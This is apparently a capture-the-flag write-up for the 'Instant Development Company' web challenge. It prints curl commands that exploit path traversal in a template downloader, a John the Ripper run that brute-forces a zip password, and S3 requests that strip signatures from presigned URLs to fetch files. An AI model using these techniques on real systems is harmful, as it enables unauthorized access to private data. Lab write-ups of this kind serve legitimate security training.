# Instant Development Company

The source of https://instant-development-company.secchallenge.crysys.hu/ reveals a link to the /debug folder.

```
...
<body>
    <a href="/" class="menu-button" style="text-align: justify;">Main page</a>
    <a href="/review" class="menu-button" style="text-align: justify;">Leave feedback</a>
    <a href="/debug" class="menu-button" style="text-align: justify;"></a>
...
```

There are a couple of potential attack points in that page. One is a template file viewer. Let's try that on debug.html with curl:

```shell
> curl 'https://instant-development-company.secchallenge.crysys.hu/download/templates'  --data-raw 'template=debug.html'
...
    <!-- [AUTOREMOVE] AN: I've created a backup of our contracts for archival purposes. It should be in a backup.zip file in the root directory. -->
    <!-- [AUTOREMOVE] AN: Unfortunately I kinda forgot the password, but I do remember that it only had numbers in it and it was 10 digits long. -->
...
```

Bingo. There has to be a backup.zip somewhere with a password of 10 digits. Let's try downloading the zip with the template downloader again:

```shell
> curl 'https://instant-development-company.secchallenge.crysys.hu/download/templates'  --data-raw 'template=../backup.zip' > backup.zip
```
Now run John the ripper to get the password:
```shell
> john --incremental=digits --min-length=10 --max-length=10 hash.txt
```

Unzip the file
```shell
> unzip -P REDACTED backup.zip
```

We find a file containing a bunch of S3 download links in the form of:
```
...
https://instant-development-company.s3.eu-central-1.amazonaws.com/00000000-0000-0000-0000-000000000000?AWSAccessKeyId=00000000000000000000&Expires=1635928981&Signature=00000000000000_0000000000000%3d
...
```

But we cannot download them:
```shell
> curl https://instant-development-company.s3.eu-central-1.amazonaws.com/00000000-0000-0000-0000-000000000000?AWSAccessKeyId=00000000000000000000&Expires=1635928981&Signature=00000000000000_0000000000000%3d
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Request has expired</Message><Expires>2021-10-13T20:41:40Z</Expires><ServerTime>2022-03-16T06:57:35Z</ServerTime><RequestId>7D3PB49BH510BXPD</RequestId><HostId>kpPQtioPMo0Tq+sY0b5wg5mlH+ZmJc/vwT7AAKwFrHSaxGLGt0cosQ1YwAqm2sAVfosziX8Tric=</HostId></Error>
```

Try removing the expires and signature part from the url:

```shell
> curl https://instant-development-company.s3.eu-central-1.amazonaws.com/00000000-0000-0000-0000-000000000000?AWSAccessKeyId=00000000000000000000
...bunch of text...
```
We just need to download all files and filter for the flag.
